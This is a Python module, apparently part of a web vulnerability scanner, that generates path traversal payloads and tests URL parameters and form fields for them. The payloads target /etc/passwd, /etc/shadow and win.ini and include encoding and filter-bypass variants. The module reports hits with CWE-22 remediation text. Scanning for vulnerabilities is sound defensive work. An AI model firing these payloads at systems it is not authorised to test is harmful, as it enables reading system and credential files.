"""
Path Traversal Scanner
Detects directory traversal and local file access vulnerabilities
"""

import asyncio
import re
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from ..utils.data_loader import data_loader


class PathTraversalScanner:
    """Scanner for Path Traversal vulnerabilities"""
    
    def __init__(self, config, session):
        """Initialize Path Traversal scanner"""
        self.config = config
        self.session = session
        self.vulnerabilities = []
        
        # Load sensitive files from data directory
        self.sensitive_files_linux = data_loader.load_sensitive_files_linux()
        self.sensitive_files_windows = data_loader.load_sensitive_files_windows()
        
        # Path traversal payloads - combines data files with encoding techniques
        self.traversal_payloads = self._generate_traversal_payloads()
        
        # Success indicators
        self.success_patterns = {
            'linux_passwd': r'root:.*:0:0:',
            'linux_shadow': r'root:\$',
            'linux_hosts': r'127\.0\.0\.1.*localhost',
            'windows_ini': r'\[.*\].*\r?\n',
            'windows_boot': r'\[boot loader\]',
        }
        
    def _generate_traversal_payloads(self) -> List[str]:
        """Generate path traversal payloads using loaded data files"""
        payloads = []
        
        # Add Linux file payloads with traversal
        for linux_file in self.sensitive_files_linux:
            # Basic traversal
            payloads.append(f'../../../{linux_file.lstrip("/")}')
            # More traversal
            payloads.append(f'../../../../../{linux_file.lstrip("/")}')
            # Direct path
            payloads.append(linux_file)
            
        # Add Windows file payloads
        for windows_file in self.sensitive_files_windows:
            # Backslash traversal
            payloads.append(f'..\\..\\..\\{windows_file.split("\\")[-1]}')
            # Direct path
            payloads.append(windows_file)
        
        # Add encoded variations
        # Add encoded variations
        encoded_payloads = [
            # URL encoded
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%5C..%5C..%5Cwindows%5Cwin.ini',
            
            # Double URL encoded
            '..%252F..%252F..%252Fetc%252Fpasswd',
            
            # Null byte (old PHP versions)
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            
            # With prefix bypass
            'file://../../etc/passwd',
            '....//....//....//etc/passwd',
            '..../..../..../etc/passwd',
            
            # Unicode encoding
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            
            # 16-bit Unicode
            '..%u002f..%u002f..%u002fetc%u002fpasswd',
        ]
        
        payloads.extend(encoded_payloads)
        return payloads if payloads else ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini']
        
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Scan for Path Traversal vulnerabilities
        """
        self.vulnerabilities = []
        
        print(f"[*] Path Traversal Scanner: Testing {target}")
        
        # Test URL parameters
        parsed = urlparse(target)
        if parsed.query:
            await self._scan_url_params(target)
        
        # Test forms
        if recon_data.get('forms'):
            for form in recon_data['forms']:
                await self._scan_form(target, form)
        
        return self.vulnerabilities
    
    async def _scan_url_params(self, url: str):
        """Test URL parameters for path traversal"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Look for file-related parameters
        file_params = ['file', 'filename', 'path', 'page', 'document', 'doc',
                      'folder', 'include', 'template', 'dir', 'download']
        
        for param_name in params.keys():
            # Check if parameter looks like a file parameter
            if any(fp in param_name.lower() for fp in file_params):
                await self._test_path_traversal_url(url, param_name)
    
    async def _scan_form(self, target: str, form: Dict[str, Any]):
        """Test form for path traversal vulnerabilities"""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        # Build form URL
        if action:
            form_url = urljoin(target, action)
        else:
            form_url = target
        
        # Look for file-related inputs
        file_params = ['file', 'filename', 'path', 'page', 'document', 'doc']
        
        for input_field in inputs:
            input_name = input_field.get('name', '')
            
            if not input_name:
                continue
            
            # Check if input looks like a file parameter
            if any(fp in input_name.lower() for fp in file_params):
                await self._test_path_traversal_form(form_url, method, input_name, inputs)
    
    async def _test_path_traversal_url(self, url: str, param: str):
        """Test URL parameter for path traversal"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for payload in self.traversal_payloads:
            test_params = params.copy()
            test_params[param] = [payload]
            
            # Build test URL
            parsed_parts = list(parsed)
            parsed_parts[4] = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed_parts)
            
            # Test the payload
            is_vulnerable, evidence = await self._check_traversal(test_url, 'GET', None)
            
            if is_vulnerable:
                self.vulnerabilities.append({
                    'type': 'path_traversal',
                    'severity': 'high',
                    'url': url,
                    'parameter': param,
                    'method': 'GET',
                    'payload': payload,
                    'evidence': evidence,
                    'description': 'Path Traversal vulnerability - Unauthorized file system access',
                    'remediation': 'Validate and sanitize file paths. Use whitelist of allowed files. Avoid direct user input in file operations.',
                    'cwe': 'CWE-22',
                    'owasp': 'A01:2021 - Broken Access Control',
                })
                return  # Found vulnerability, stop testing this parameter
    
    async def _test_path_traversal_form(self, url: str, method: str, param: str,
                                       all_inputs: List[Dict]):
        """Test form parameter for path traversal"""
        
        # Build base data
        data = {}
        for inp in all_inputs:
            name = inp.get('name', '')
            if name:
                data[name] = inp.get('value', 'test')
        
        for payload in self.traversal_payloads[:10]:  # Limit payloads for forms
            test_data = data.copy()
            test_data[param] = payload
            
            is_vulnerable, evidence = await self._check_traversal(url, method, test_data)
            
            if is_vulnerable:
                self.vulnerabilities.append({
                    'type': 'path_traversal',
                    'severity': 'high',
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'payload': payload,
                    'evidence': evidence,
                    'description': 'Path Traversal vulnerability - Unauthorized file system access',
                    'remediation': 'Validate and sanitize file paths. Use whitelist of allowed files. Avoid direct user input in file operations.',
                    'cwe': 'CWE-22',
                    'owasp': 'A01:2021 - Broken Access Control',
                })
                return
    
    async def _check_traversal(self, url: str, method: str, data: Dict) -> tuple:
        """Check if path traversal is successful"""
        try:
            if method == 'POST':
                async with self.session.post(url, data=data, timeout=10) as response:
                    content = await response.text()
            else:
                async with self.session.get(url, timeout=10) as response:
                    content = await response.text()
            
            # Check for success patterns
            for pattern_name, pattern in self.success_patterns.items():
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return True, f'Pattern matched: {pattern_name} - {match.group(0)[:100]}'
            
        except Exception:
            pass
        
        return False, ''
